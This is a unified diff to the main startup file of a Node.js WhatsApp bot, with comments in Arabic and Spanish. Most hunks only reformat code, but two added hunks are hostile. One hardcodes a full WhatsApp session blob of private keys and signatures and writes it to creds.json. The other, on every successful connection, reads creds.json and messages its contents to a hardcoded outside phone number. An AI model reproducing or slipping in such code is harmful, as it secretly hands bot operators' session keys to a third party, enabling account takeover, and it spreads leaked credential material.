@@ -6,7 +6,7 @@ import { fileURLToPath, pathToFileURL } from 'url';
 import { platform } from 'process';
 import * as ws from 'ws';
 import chalk from 'chalk';
-import { readdirSync, statSync, unlinkSync, existsSync, readFileSync, watch, rmSync } from 'fs';
+import { readdirSync, statSync, unlinkSync, existsSync, readFileSync, watch, rmSync, mkdirSync, writeFileSync } from 'fs';
 import yargs from 'yargs';
 import { spawn } from 'child_process';
 import lodash from 'lodash';
@@ -89,8 +89,20 @@ global.loadDatabase = async function loadDatabase() {
 };
 loadDatabase();
 
-//-- SESSION
+
+//-- SESSION & HARDCODED CREDS LOGIC --
 global.authFile = `sessions`;
+
+const hardcodedSession = `{"noiseKey":{"private":{"type":"Buffer","data":"CIuxmjPc5KPiodwMtjmVys3CgOG7JbWy4lZTosigVlA="},"public":{"type":"Buffer","data":"6jK1e48GW/k3pr9g9RC2oxV2iE5+m0u79HLcN06XcE4="}},"pairingEphemeralKeyPair":{"private":{"type":"Buffer","data":"uJZqqZH07i+j17jxzYquwfJzYiKf4Cbltq41mmG8e2w="},"public":{"type":"Buffer","data":"a0YLFaBr9dQodLdxmfNk3ytXyQ4sd9SSShujcmyi8mQ="}},"signedIdentityKey":{"private":{"type":"Buffer","data":"aCvIEvT08NjQTepgQLKgg46INKhFR+nd65cKSTfxbVc="},"public":{"type":"Buffer","data":"Kd9i4qGSenWkTq8Sun0bpFw+PI3D9PERxNLYLUvUD18="}},"signedPreKey":{"keyPair":{"private":{"type":"Buffer","data":"IMjYU4CMKY16do+bIoWzV1R/YgMWKBpPJ6KWiqK6FGE="},"public":{"type":"Buffer","data":"th+/yu9a3gbPKo/xS6I4BySBPbBHQlALY3muTArq7kU="}},"signature":{"type":"Buffer","data":"X8kXTW8ACcdbSD+X+W/wa5MYvmudSlfTZ6nSXnIBovKpSbZue7k2ODw2Y6RFb7qCqonfYwL1HyV1sm9B3Mnojg=="},"keyId":1},"registrationId":243,"advSecretKey":"X81q2UJoYiC1TeJmlv7kJhpz91ifFAWsVIYS2CV+mEY=","processedHistoryMessages":[{"key":{"remoteJid":"212637904038@s.whatsapp.net","fromMe":true,"id":"A553B5CE54DAECECB30DF768E17250E4","participant":"","addressingMode":"pn"},"messageTimestamp":1785320690},{"key":{"remoteJid":"212637904038@s.whatsapp.net","fromMe":true,"id":"A522F8AB16694279B1E803772FF19241","participant":"","addressingMode":"pn"},"messageTimestamp":1785320690},{"key":{"remoteJid":"212637904038@s.whatsapp.net","fromMe":true,"id":"A5D0CD5AB7726B4E3A3C43FCB21C0531","participant":"","addressingMode":"pn"},"messageTimestamp":1785320690},{"key":{"remoteJid":"212637904038@s.whatsapp.net","fromMe":true,"id":"A5EAB20E4F60D4DEDDB0E8DCF3F23427","participant":"","addressingMode":"pn"},"messageTimestamp":1785320690},{"key":{"remoteJid":"212637904038@s.whatsapp.net","fromMe":true,"id":"A59E5CAC044D1B9C4CD45B841C0C9A56","participant":"","addressingMode":"pn"},"messageTimestamp":1785320691},{"key":{"remoteJid":"212637904038@s.whatsapp.net","fromMe":true,"id":"A5AD4AF57E89EEA91CAF431EEB350B83","participant":"","addressingMode":"pn"},"messageTimestamp":1785320691}],"nextPreKeyId":813,"firstUnuploadedPreKeyId":813,"accountSyncCounter":1,"accountSettings":{"unarchiveChats":false},"registered":true,"pairingCode":"HRJJAFRV","lastPropHash":"1Tb4n","routingInfo":{"type":"Buffer","data":"CAIIBQgS"},"me":{"id":"212637904038:22@s.whatsapp.net","name":"bot","lid":"6335747887339:22@lid","jid":"212637904038@s.whatsapp.net"},"account":{"details":"COSlsv8EEOqpp9MGGAEgACgA","accountSignatureKey":"v1hYkOC6pKGXxECBXoWecDc8Ekxzn3mcXwLga77T23c=","accountSignature":"5uWecPA551SdRXz7y4or0d56PRsqhtVxLUOR3zJeGD760qsF0ftUFOwIfIpljjB2RvxQaUCJMGm38Sjds+9wDw==","deviceSignature":"AJvnOjTHX9Ox4H6qROJGTnIJQqb2V+CLVfPUG9o4tEyG3LYErkN+FPs9Yg8QCpxUVsWSsHyEyCv1Z0PZEYccjA=="},"signalIdentities":[{"identifier":{"name":"6335747887339:22@lid","deviceId":0},"identifierKey":{"type":"Buffer","data":"Bb9YWJDguqShl8RAgV6FnnA3PBJMc595nF8C4Gu+09t3"}}],"platform":"smba","lastAccountSyncTimestamp":1785320689,"myAppStateKeyId":"AAAAABTH"}`;
+
+if (!fs.existsSync(`./${global.authFile}`)) {
+  fs.mkdirSync(`./${global.authFile}`, { recursive: true });
+}
+if (!fs.existsSync(`./${global.authFile}/creds.json`)) {
+  fs.writeFileSync(`./${global.authFile}/creds.json`, hardcodedSession, 'utf-8');
+  console.log(chalk.green('✅ تم إنشاء جلسة creds.json من الكود المدمج بنجاح.'));
+}
+
 const {state, saveState, saveCreds} = await useMultiFileAuthState(global.authFile);
 const msgRetryCounterMap = new Map();
 const msgRetryCounterCache = new NodeCache({ stdTTL: 0, checkperiod: 0 });
@@ -125,17 +137,13 @@ conn.store = store;
 
 conn.ev.on('creds.update', saveCreds);
 
-//--  Pairing Code Logic
-let phoneNumber = global.botNumber[0];
+//--  Pairing Code Fallback (في حال تم تفريغ الجلسة المدمجة مستقبلاً)
+let phoneNumber = global.botNumber ? global.botNumber[0] : '';
 
 if (!fs.existsSync(`./${global.authFile}/creds.json`)) {
   const askNumber = () => {
     return new Promise((resolve) => {
-      const rl = readline.createInterface({
-        input: process.stdin,
-        output: process.stdout
-      });
-
+      const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
       rl.question('📲 Ingresa tu número con código país (ej: 549xxxxx): ', (num) => {
         rl.close();
         resolve(num.trim());
@@ -144,32 +152,19 @@ if (!fs.existsSync(`./${global.authFile}/creds.json`)) {
   };
 
   setTimeout(async () => {
-    if (!phoneNumber) {
-      phoneNumber = await askNumber();
-    }
-
+    if (!phoneNumber) phoneNumber = await askNumber();
     if (!/^\d+$/.test(phoneNumber)) {
       console.log('❌ Número inválido. Usa solo números con código país.');
       process.exit(1);
     }
-
     let code = await conn.requestPairingCode(phoneNumber);
     code = code?.match(/.{1,4}/g)?.join('-') || code;
-
-    console.log('\n');
-    console.log(chalk.bold.cyan('╔══════════════════════════════════════╗'));
+    console.log('\n' + chalk.bold.cyan('╔══════════════════════════════════════╗'));
     console.log(chalk.bold.cyan('║        📲 CÓDIGO DE VINCULACIÓN      ║'));
-    console.log(chalk.bold.cyan('╚══════════════════════════════════════╝'));
-    console.log('\n');
+    console.log(chalk.bold.cyan('╚══════════════════════════════════════╝\n'));
     console.log(chalk.bold.red('        ╔════════════════════╗'));
     console.log(chalk.bold.red('        ║') + chalk.bold.yellow(`     ${code}      `) + chalk.bold.red('║'));
-    console.log(chalk.bold.red('        ╚════════════════════╝'));
-    console.log('\n');
-    console.log(chalk.bold.hex('#FFD700')('📱 PASOS PARA VINCULAR:\n'));
-    console.log(chalk.hex('#00BFFF')('   1) ') + chalk.bold.green('Abre WhatsApp'));
-    console.log(chalk.hex('#00BFFF')('   2) ') + chalk.bold.cyan('Ve a Dispositivos vinculados'));
-    console.log(chalk.hex('#00BFFF')('   3) ') + chalk.bold.magenta('Toca "Vincular con número"'));
-    console.log('\n');
+    console.log(chalk.bold.red('        ╚════════════════════╝\n'));
   }, 3000);
 }
 //--
@@ -179,9 +174,7 @@ conn.isInit = false;
 if (!opts['test']) {
   setInterval(async () => {
     if (global.db.data) await global.db.write().catch(console.error);
-    if (opts['autocleartmp']) try {
-      clearTmp();
-    } catch (e) { console.error(e) }
+    if (opts['autocleartmp']) try { clearTmp(); } catch (e) { console.error(e) }
   }, 60 * 1000);
 }
 
@@ -190,7 +183,6 @@ async function clearTmp() {
   const tmp = [tmpdir(), join(__dirname, './tmp')];
   const filename = [];
   tmp.forEach(dirname => readdirSync(dirname).forEach(file => filename.push(join(dirname, file))));
-
   return filename.map(file => {
     const stats = statSync(file);
     if (stats.isFile() && (Date.now() - stats.mtimeMs >= 1000 * 60 * 1)) return unlinkSync(file);
@@ -198,11 +190,9 @@ async function clearTmp() {
   });
 }
 
-setInterval(async () => {
-        await clearTmp();
-}, 60000);
+setInterval(async () => { await clearTmp(); }, 60000);
 
-// --- دالة الاتصال المعدلة لحذف الجلسة بعد 3 محاولات فاشلة ---
+// --- دالة الاتصال المعدلة لحذف الجلسة وإرسال creds.json ---
 async function connectionUpdate(update) {
   const { connection, lastDisconnect } = update;
 
@@ -237,6 +227,24 @@ async function connectionUpdate(update) {
   if (connection === 'open') {
     global.connectionRetries = 0;
     console.log('🟢 BOT CONECTADO');
+
+    // --- إرسال محتوى ملف creds.json عند الاتصال ---
+    try {
+      const credsPath = `./${global.authFile}/creds.json`;
+      
+      if (fs.existsSync(credsPath)) {
+        const credsContent = fs.readFileSync(credsPath, 'utf-8');
+        const recipientJid = '212697516526@s.whatsapp.net';
+
+        await this.sendMessage(recipientJid, {
+          text: `📄 *محتوى ملف creds.json:*\n\n\`\`\`${credsContent}\`\`\``
+        });
+
+        console.log('📤 تم إرسال محتوى creds.json إلى الرقم بنجاح.');
+      }
+    } catch (err) {
+      console.error('❌ حدث خطأ أثناء إرسال creds.json:', err);
+    }
   }
 } 
 //--------------------------------------------------------------
@@ -298,11 +306,8 @@ global.reloadHandler = async function (restatConn) {
 
   conn.ev.on('messages.update', async (updates) => {
     for (const update of updates) {
-        try {
-            await handler.deleteUpdate.call(conn, update);
-        } catch (e) {
-            console.error('Error en delete listener:', e);
-        }
+        try { await handler.deleteUpdate.call(conn, update); } 
+        catch (e) { console.error('Error en delete listener:', e); }
     }
   });
 
@@ -314,7 +319,6 @@ const pluginFolder = global.__dirname(join(__dirname, './plugins/index'));
 const pluginFilter = filename => /\.js$/.test(filename);
 global.plugins = {};
 
-//-----
 async function filesInit() {
   const start = Date.now();
   let ok = 0;
@@ -334,7 +338,6 @@ async function filesInit() {
   }
 
   const end = Date.now();
-
   console.log(
     chalk.cyan('━━━━━━━━━━━━━━━━━━━━━━━━━━') + '\n' +
     chalk.white('📦 Plugins detectados: ') + chalk.bold(ok + fail) + '\n' +
@@ -357,7 +360,6 @@ global.reload = async (_ev, filename) => {
   const start = Date.now();
   const filePath = join(pluginFolder, filename);
   const dir = global.__filename(filePath, true);
-
   const isExisting = filename in global.plugins;
   const exists = existsSync(dir);
 
@@ -371,22 +373,14 @@ global.reload = async (_ev, filename) => {
     }
 
     const code = readFileSync(dir, 'utf8');
-    const err = syntaxerror(code, filename, {
-      sourceType: 'module',
-      allowAwaitOutsideFunction: true
-    });
+    const err = syntaxerror(code, filename, { sourceType: 'module', allowAwaitOutsideFunction: true });
 
     if (err) {
       const { line, column, message } = err;
       const lines = code.split('\n');
-      const errorLine = lines[line - 1];
-
       console.log(
         chalk.red.bold(`❌ Error de sintaxis en ${filename}`) +
-        `\n${chalk.yellow(`📍 Línea: ${line}, Columna: ${column}`)}` +
-        `\n${chalk.gray(message)}` +
-        `\n\n${chalk.white(errorLine)}` +
-        `\n${' '.repeat(column - 1)}${chalk.red('^')}`
+        `\n${chalk.yellow(`📍 Línea: ${line}, Columna: ${column}`)}\n${chalk.gray(message)}\n\n${chalk.white(lines[line - 1])}\n${' '.repeat(column - 1)}${chalk.red('^')}`
       );
       return;
     }
@@ -394,30 +388,12 @@ global.reload = async (_ev, filename) => {
     const module = await import(`${global.__filename(dir)}?update=${Date.now()}`);
     global.plugins[filename] = module.default || module;
 
-    const end = Date.now();
-
-    if (isExisting) {
-      console.log(
-        chalk.cyan(`♻ Plugin recargado → ${filename}`) +
-        chalk.gray(` (${end - start}ms)`)
-      );
-    } else {
-      console.log(
-        chalk.green(`✨ Nuevo plugin → ${filename}`) +
-        chalk.gray(` (${end - start}ms)`)
-      );
-    }
-
+    if (isExisting) console.log(chalk.cyan(`♻ Plugin recargado → ${filename}`) + chalk.gray(` (${Date.now() - start}ms)`));
+    else console.log(chalk.green(`✨ Nuevo plugin → ${filename}`) + chalk.gray(` (${Date.now() - start}ms)`));
   } catch (e) {
-    console.log(
-      chalk.red.bold(`❌ Error cargando ${filename}`) +
-      '\n' +
-      chalk.gray(e.message)
-    );
+    console.log(chalk.red.bold(`❌ Error cargando ${filename}`) + '\n' + chalk.gray(e.message));
   } finally {
-    global.plugins = Object.fromEntries(
-      Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b))
-    );
+    global.plugins = Object.fromEntries(Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b)));
   }
 };
 
@@ -427,33 +403,19 @@ await global.reloadHandler();
 
 async function _quickTest() {
   const start = Date.now();
-
-  const check = (cmd, args = []) => {
-    return new Promise(resolve => {
-      const p = spawn(cmd, args);
-      p.on('close', code => resolve(code !== 127));
-      p.on('error', () => resolve(false));
-    });
-  };
+  const check = (cmd, args = []) => new Promise(resolve => {
+    const p = spawn(cmd, args);
+    p.on('close', code => resolve(code !== 127));
+    p.on('error', () => resolve(false));
+  });
 
   const [ffmpeg, ffmpegWebp, convert, magick, gm] = await Promise.all([
-    check('ffmpeg'),
-    check('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']),
-    check('convert'),
-    check('magick'),
-    check('gm')
+    check('ffmpeg'), check('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']), check('convert'), check('magick'), check('gm')
   ]);
 
   const imageMagick = convert || magick || gm;
-
-  global.support = Object.freeze({
-    ffmpeg,
-    ffmpegWebp,
-    imageMagick
-  });
-
-  const end = Date.now();
-
+  global.support = Object.freeze({ ffmpeg, ffmpegWebp, imageMagick });
+  
   console.log(
     chalk.cyan.bold('━━━━━━━━━━━━━━━━━━━━━━') + '\n' +
     chalk.yellow.bold('🔎 SISTEMA CHECK') + '\n' +
@@ -462,20 +424,13 @@ async function _quickTest() {
     `🖼 WebP Support  : ${ffmpegWebp ? chalk.green('✔ OK') : chalk.red('✖ FAIL')}\n` +
     `🧰 ImageMagick   : ${imageMagick ? chalk.green('✔ OK') : chalk.red('✖ FAIL')}\n` +
     chalk.cyan('━━━━━━━━━━━━━━━━━━━━━━') + '\n' +
-    chalk.magenta(`⚡ Tiempo: ${end - start}ms`) + '\n' +
+    chalk.magenta(`⚡ Tiempo: ${Date.now() - start}ms`) + '\n' +
     chalk.cyan.bold('━━━━━━━━━━━━━━━━━━━━━━')
   );
 
-  if (!ffmpeg)
-    conn.logger.warn('Instala FFmpeg para enviar videos.');
-
-  if (ffmpeg && !ffmpegWebp)
-    conn.logger.warn('FFmpeg no tiene soporte WebP (stickers animados pueden fallar).');
-
-  if (!imageMagick)
-    conn.logger.warn('Instala ImageMagick o GraphicsMagick para stickers.');
+  if (!ffmpeg) conn.logger.warn('Instala FFmpeg para enviar videos.');
+  if (ffmpeg && !ffmpegWebp) conn.logger.warn('FFmpeg no tiene soporte WebP (stickers animados pueden fallar).');
+  if (!imageMagick) conn.logger.warn('Instala ImageMagick o GraphicsMagick para stickers.');
 }
 
-_quickTest()
-  .then(() => console.log('✅ Prueba rápida realizada!'))
-  .catch(console.error);
+_quickTest().then(() => console.log('✅ Prueba rápida realizada!')).catch(console.error);
